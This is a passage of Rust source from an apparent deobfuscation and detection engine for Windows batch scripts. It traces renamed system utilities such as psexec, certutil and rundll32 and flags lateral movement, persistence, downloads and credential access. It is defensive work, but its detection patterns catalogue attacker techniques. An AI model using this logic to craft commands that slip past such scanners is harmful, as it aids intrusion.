            "ipconfig.exe" | "ipconfig" => "ipconfig.exe",
            "getmac.exe" | "getmac" => "getmac.exe",
            "netstat.exe" | "netstat" => "netstat.exe",
            "arp.exe" | "arp" => "arp.exe",
            "route.exe" | "route" => "route.exe",
            _ => continue,
        };
        insert_alias_command_names(&mut aliases, dst, replay_command);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let replay_command = aliases
            .get(&basename_lower(cmd))
            .or_else(|| aliases.get(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase()));
        let Some(replay_command) = replay_command else {
            continue;
        };

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            (*replay_command).to_string()
        } else {
            format!("{replay_command} {rest}")
        };
        scan_enumeration(&replay, env);
    }
}

fn scan_copied_network_probe_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashMap<String, &'static str> =
        std::collections::HashMap::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        let replay_command = match src_base.as_str() {
            "nslookup.exe" | "nslookup" => "nslookup.exe",
            "ping.exe" | "ping" => "ping.exe",
            "tracert.exe" | "tracert" => "tracert.exe",
            "pathping.exe" | "pathping" => "pathping.exe",
            _ => continue,
        };
        insert_alias_command_names(&mut aliases, dst, replay_command);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let replay_command = aliases
            .get(&basename_lower(cmd))
            .or_else(|| aliases.get(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase()));
        let Some(replay_command) = replay_command else {
            continue;
        };
        if tokens.len() < 2 {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            (*replay_command).to_string()
        } else {
            format!("{replay_command} {rest}")
        };
        scan_network_probe(&replay, env);
    }
}

fn insert_alias_command_names(
    aliases: &mut std::collections::HashMap<String, &'static str>,
    dst: &str,
    replay_command: &'static str,
) {
    let dst_base = basename_lower(dst);
    aliases.insert(dst_base.clone(), replay_command);
    if let Some(stem) = dst_base.strip_suffix(".exe") {
        aliases.insert(stem.to_string(), replay_command);
    }
    aliases.insert(
        dst.trim_matches(['"', '\'']).to_ascii_lowercase(),
        replay_command,
    );
}

fn scan_copied_reg_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "reg.exe" && src_base != "reg" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "reg.exe".to_string()
        } else {
            format!("reg.exe {rest}")
        };
        let child_start = env.exec_cmd.len();
        crate::handlers::passthrough::h_reg(&replay, env);
        scan_defender_evasion(&replay, env);
        scan_remote_access(&replay, env);
        let new_children = env.exec_cmd.get(child_start..).unwrap_or_default().to_vec();
        for child in new_children {
            replay_copied_alias_child_command(&child, env);
            replay_embedded_url_variable_curl(line, &child, env);
        }
    }
}

fn scan_copied_psexec_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "psexec.exe" && src_base != "psexec" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    let lines: Vec<&str> = deobfuscated.lines().collect();
    for (line_idx, line) in lines.iter().enumerate() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "psexec.exe".to_string()
        } else {
            format!("psexec.exe {rest}")
        };
        crate::handlers::passthrough::h_psexec(&replay, env);
        if let Some((host, inner)) = crate::handlers::passthrough::psexec_child_command(&replay) {
            if !env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::LateralMovement { tool, target_host }
                        if tool == "psexec" && target_host == &host
                )
            }) {
                env.traits.push(Trait::LateralMovement {
                    tool: "psexec".to_string(),
                    target_host: host,
                });
            }
            replay_copied_alias_child_command(&inner, env);
            replay_following_url_variable_curl(line, &lines, line_idx, env);
        }
    }
}

fn scan_copied_winrs_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "winrs.exe" && src_base != "winrs" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    let lines: Vec<&str> = deobfuscated.lines().collect();
    for (line_idx, line) in lines.iter().enumerate() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "winrs.exe".to_string()
        } else {
            format!("winrs.exe {rest}")
        };
        crate::handlers::passthrough::h_winrs(&replay, env);
        if let Some((host, inner)) = crate::handlers::passthrough::winrs_child_command(&replay) {
            if !env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::RemoteExec { tool, target_host }
                        if tool == "winrs" && target_host == &host
                )
            }) {
                env.traits.push(Trait::RemoteExec {
                    tool: "winrs".to_string(),
                    target_host: host,
                });
            }
            replay_copied_alias_child_command(&inner, env);
            replay_following_url_variable_curl(line, &lines, line_idx, env);
        }
    }
}

fn scan_copied_winrm_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "winrm.exe" && src_base != "winrm" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "winrm.exe".to_string()
        } else {
            format!("winrm.exe {rest}")
        };
        crate::handlers::passthrough::h_winrm(&replay, env);
        if let Some((host, inner)) = crate::handlers::passthrough::winrm_child_command(&replay) {
            if !env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::RemoteExec { tool, target_host }
                        if tool == "winrm" && target_host == &host
                )
            }) {
                env.traits.push(Trait::RemoteExec {
                    tool: "winrm".to_string(),
                    target_host: host,
                });
            }
            replay_copied_alias_child_command(&inner, env);
            replay_embedded_url_variable_curl(line, &inner, env);
        }
    }
}

fn replay_copied_alias_child_command(command: &str, env: &mut Environment) {
    let (child, delayed) = if let Some(cmd_inner) = crate::handlers::cmd::extract_cmd_inner(command)
    {
        (cmd_inner, crate::handlers::cmd::has_v_on_raw(command))
    } else {
        (command.to_string(), false)
    };

    let saved_delayed = env.delayed_expansion;
    if delayed {
        env.delayed_expansion = true;
    }
    for segment in crate::split::split_commands(&child) {
        let normalized =
            crate::normalize::normalize_literal_command_fast(&segment).unwrap_or_else(|| {
                let toks = crate::lex::lex(&segment);
                crate::normalize::normalize_to_string(&toks, env)
            });
        crate::interp::interpret_line(&normalized, env);
    }
    env.delayed_expansion = saved_delayed;
}

fn replay_embedded_url_variable_curl(source_line: &str, command: &str, env: &mut Environment) {
    let child = crate::handlers::cmd::extract_cmd_inner(command)
        .unwrap_or_else(|| command.trim().to_string());
    for segment in crate::split::split_commands(&child) {
        replay_url_variable_curl(source_line, &segment, env);
    }
}

fn replay_following_url_variable_curl(
    source_line: &str,
    lines: &[&str],
    line_idx: usize,
    env: &mut Environment,
) {
    let Some(next_line) = lines.get(line_idx + 1).map(|line| line.trim()) else {
        return;
    };
    replay_url_variable_curl(source_line, next_line, env);
}

fn replay_url_variable_curl(source_line: &str, curl_line: &str, env: &mut Environment) {
    let Some(url) = env.traits.iter().rev().find_map(|t| match t {
        Trait::UrlVariable { cmd, url, .. } if cmd == source_line => Some(url.clone()),
        _ => None,
    }) else {
        return;
    };
    if curl_line.contains("://") {
        return;
    }
    let tokens = split_words(curl_line);
    let Some(first) = tokens.first() else {
        return;
    };
    let tool = command_name(strip_quotes(first));
    if tool != "curl" && tool != "curl.exe" {
        return;
    }
    let replay = format!("{} {}", curl_line.trim_end(), url);
    crate::handlers::curl::h_curl(&replay, env);
}

fn scan_copied_schtasks_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "schtasks.exe" && src_base != "schtasks" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "schtasks.exe".to_string()
        } else {
            format!("schtasks.exe {rest}")
        };
        let child_start = env.exec_cmd.len();
        crate::handlers::passthrough::h_schtasks(&replay, env);
        scan_defender_evasion(&replay, env);
        let new_children = env.exec_cmd.get(child_start..).unwrap_or_default().to_vec();
        for child in new_children {
            if let Some(cmd_inner) = crate::handlers::cmd::extract_cmd_inner(&child) {
                crate::interp::interpret_line(&cmd_inner, env);
            } else {
                crate::interp::interpret_line(&child, env);
            }
        }
    }
}

fn scan_copied_sc_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "sc.exe" && src_base != "sc" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "sc.exe".to_string()
        } else {
            format!("sc.exe {rest}")
        };
        crate::handlers::passthrough::h_sc(&replay, env);
        scan_defender_evasion(&replay, env);
        if let Some((service_name, bin_path)) =
            crate::handlers::passthrough::sc_service_binpath(&replay)
        {
            if !env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::ServiceInstall {
                        service_name: existing,
                        ..
                    } if existing == &service_name
                )
            }) {
                env.traits.push(Trait::ServiceInstall {
                    service_name,
                    bin_path: bin_path.clone(),
                });
            }
            replay_persisted_child_command(&bin_path, env);
        }
        if let Some((service_name, command)) =
            crate::handlers::passthrough::sc_failure_command(&replay)
        {
            env.traits.push(Trait::Persistence {
                hive: "ServiceFailureCommand".to_string(),
                key: service_name,
                value_name: "command".to_string(),
                command: command.clone(),
            });
            replay_persisted_child_command(&command, env);
        }
    }
}

fn scan_copied_at_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "at.exe" && src_base != "at" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "at.exe".to_string()
        } else {
            format!("at.exe {rest}")
        };
        crate::handlers::passthrough::h_at(&replay, env);
        if let Some(target_host) = crate::handlers::passthrough::at_remote_host(&replay) {
            env.traits.push(Trait::LateralMovement {
                tool: "at".to_string(),
                target_host,
            });
        }
        if let Some((time, command)) = crate::handlers::passthrough::at_scheduled_command(&replay) {
            env.traits.push(Trait::Persistence {
                hive: "AtJob".to_string(),
                key: time,
                value_name: "command".to_string(),
                command: command.clone(),
            });
            replay_persisted_child_command(&command, env);
        }
    }
}

fn replay_persisted_child_command(command: &str, env: &mut Environment) {
    if let Some((child, _delayed)) = crate::handlers::passthrough::persisted_command_child(command)
    {
        if let Some(cmd_inner) = crate::handlers::cmd::extract_cmd_inner(&child) {
            crate::interp::interpret_line(&cmd_inner, env);
        } else {
            crate::interp::interpret_line(&child, env);
        }
    }
}

fn scan_copied_handler_alias_deob_text(
    deobfuscated: &str,
    env: &mut Environment,
    source_bases: &[&str],
    replay_command: &str,
    handler: fn(&str, &mut Environment),
) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if !source_bases.iter().any(|base| src_base == *base) {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            replay_command.to_string()
        } else {
            format!("{replay_command} {rest}")
        };
        handler(&replay, env);
    }
}

fn scan_copied_certutil_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "certutil.exe" && src_base != "certutil" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        for (idx, token) in tokens.iter().enumerate() {
            if !aliases.contains(&basename_lower(token))
                && !aliases.contains(&token.trim_matches(['"', '\'']).to_ascii_lowercase())
            {
                continue;
            }
            if !tokens[idx + 1..]
                .iter()
                .any(|arg| is_certutil_operation_flag(arg))
            {
                continue;
            }

            let replay = if let Some(start) = line.find(token) {
                let rest = line[start + token.len()..].trim_start();
                if rest.is_empty() {
                    "certutil.exe".to_string()
                } else {
                    format!("certutil.exe {rest}")
                }
            } else {
                format!("certutil.exe {}", tokens[idx + 1..].join(" "))
            };
            if env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::ManipulatedExec {
                        cmd: existing_cmd,
                        target
                    } if existing_cmd == line
                        && target.eq_ignore_ascii_case(token.trim_matches(['"', '\'']))
                )
            }) {
                continue;
            }
            push_manipulated_exec_once(env, line, token);
            crate::handlers::certutil::h_certutil(&replay, env);
        }
    }
}

fn is_certutil_operation_flag(token: &str) -> bool {
    matches!(
        token
            .trim_matches(['"', '\''])
            .to_ascii_lowercase()
            .as_str(),
        "-decode"
            | "/decode"
            | "-decodehex"
            | "/decodehex"
            | "-urlcache"
            | "/urlcache"
            | "-verifyctl"
            | "/verifyctl"
    )
}

fn scan_copied_cmd_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "cmd.exe" && src_base != "cmd" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let (Some(cmd), Some(switch)) = (tokens.first(), tokens.get(1)) else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        let switch = switch.trim_matches(['"', '\'']);
        if !switch.eq_ignore_ascii_case("/c")
            && !switch.eq_ignore_ascii_case("-c")
            && !switch.eq_ignore_ascii_case("/k")
            && !switch.eq_ignore_ascii_case("-k")
        {
            continue;
        }
        push_manipulated_exec_once(env, line, cmd);
    }
}

fn scan_copied_mshta_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "mshta.exe" && src_base != "mshta" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "mshta.exe".to_string()
        } else {
            format!("mshta.exe {rest}")
        };
        crate::handlers::mshta::h_mshta(&replay, env);
    }
}

fn scan_copied_msiexec_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "msiexec.exe" && src_base != "msiexec" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "msiexec.exe".to_string()
        } else {
            format!("msiexec.exe {rest}")
        };
        crate::handlers::msiexec::h_msiexec(&replay, env);
    }
}

fn scan_copied_regsvr32_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "regsvr32.exe" && src_base != "regsvr32" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "regsvr32.exe".to_string()
        } else {
            format!("regsvr32.exe {rest}")
        };
        crate::handlers::regsvr32::h_regsvr32(&replay, env);
    }
}

fn scan_copied_rundll32_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "rundll32.exe" && src_base != "rundll32" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "rundll32.exe".to_string()
        } else {
            format!("rundll32.exe {rest}")
        };
        crate::handlers::rundll32::h_rundll32(&replay, env);
        scan_credential_access(&replay, env);
    }
}

fn insert_alias_names(aliases: &mut std::collections::HashSet<String>, path: &str) {
    let full = path.trim_matches(['"', '\'']).to_ascii_lowercase();
    if !full.is_empty() {
        aliases.insert(full);
    }
    let base = basename_lower(path);
    if !base.is_empty() {
        aliases.insert(base.clone());
    }
    if let Some((stem, _)) = base.rsplit_once('.') {
        if !stem.is_empty() {
            aliases.insert(stem.to_string());
        }
    }
}

fn url_basename(url: &str) -> Option<String> {
    let path = url
        .split_once("://")
        .map(|(_, rest)| rest)
        .unwrap_or(url)
        .split(['?', '#'])
        .next()
        .unwrap_or(url)
        .trim_end_matches(['/', '\\']);
    let name = path.rsplit(['/', '\\']).next()?.trim();
    if name.is_empty() {
        None
    } else {
        Some(name.to_string())
    }
}

fn join_windows_path(prefix: &str, name: &str) -> String {
    if prefix.ends_with(['\\', '/']) {
        format!("{prefix}{name}")
    } else {
        format!("{prefix}\\{name}")
    }
}

fn is_windows_rooted_path(path: &str) -> bool {
    let bytes = path.as_bytes();
    path.starts_with(['\\', '/'])
        || bytes
            .get(0..2)
            .is_some_and(|head| head[0].is_ascii_alphabetic() && head[1] == b':')
}

fn clean_command_url_token(token: &str) -> &str {
    let token = token.trim_matches(['"', '\'']);
    token
        .split(['"', '\'', ')', ' ', '\t', '\r', '\n'])
        .next()
        .unwrap_or(token)
        .trim_end_matches(['.', ',', ';', ':'])
}

fn is_curl_remote_name_flag(token: &str) -> bool {
    let Some(flags) = token.strip_prefix('-') else {
        return false;
    };
    if flags.starts_with('-') {
        return false;
    }
    let lower = flags.to_ascii_lowercase();
    lower.contains('l') && lower.contains('j') && lower.contains('o') && lower.contains('k')
}

fn scan_curl_style_compact_flags_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let cmd_base = basename_lower(cmd);
        if !cmd_base.ends_with(".exe") || is_known_non_curl_compact_flag_host(&cmd_base) {
            continue;
        }
        if !tokens
            .iter()
            .skip(1)
            .any(|token| is_curl_remote_name_flag(token.trim_matches('"')))
        {
            continue;
        }
        for token in tokens.iter().skip(1) {
            let url = token.trim_matches('"');
            let Some(url) = normalize_curl_url_token(url) else {
                continue;
            };
            if !known.insert(url.clone()) {
                continue;
            }
            let dst = url_basename(&url);
            env.traits.push(Trait::Download {
                cmd: line.to_string(),
                src: url,
                dst,
            });
        }
    }
}

fn is_known_non_curl_compact_flag_host(cmd_base: &str) -> bool {
    matches!(
        cmd_base,
        "powershell.exe"
            | "pwsh.exe"
            | "cmd.exe"
            | "wscript.exe"
            | "cscript.exe"
            | "mshta.exe"
            | "rundll32.exe"
            | "regsvr32.exe"
            | "certutil.exe"
            | "bitsadmin.exe"
            | "msiexec.exe"
            | "explorer.exe"
            | "hh.exe"
    )
}

fn parse_curl_like_download(tokens: &[String]) -> Option<(String, Option<String>)> {
    let mut url: Option<String> = None;
    let mut dst: Option<String> = None;
    let mut output_dir: Option<String> = None;
    let mut remote_name = false;
    let mut i = 1;
    while i < tokens.len() {
        let raw_token = tokens[i].trim_matches(['"', '\'', ')']);
        let token = clean_command_url_token(raw_token);
        let lower = raw_token.to_ascii_lowercase();
        if let Some(value) = short_option_cluster_output(raw_token, 'o') {
            if value.is_empty() {
                dst = tokens
                    .get(i + 1)
                    .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
                i += 2;
            } else {
                dst = Some(value.trim_matches(['"', '\'', ')']).to_string());
                i += 1;
            }
            continue;
        }
        if short_option_cluster_remote_name(raw_token) {
            remote_name = true;
            i += 1;
            continue;
        }
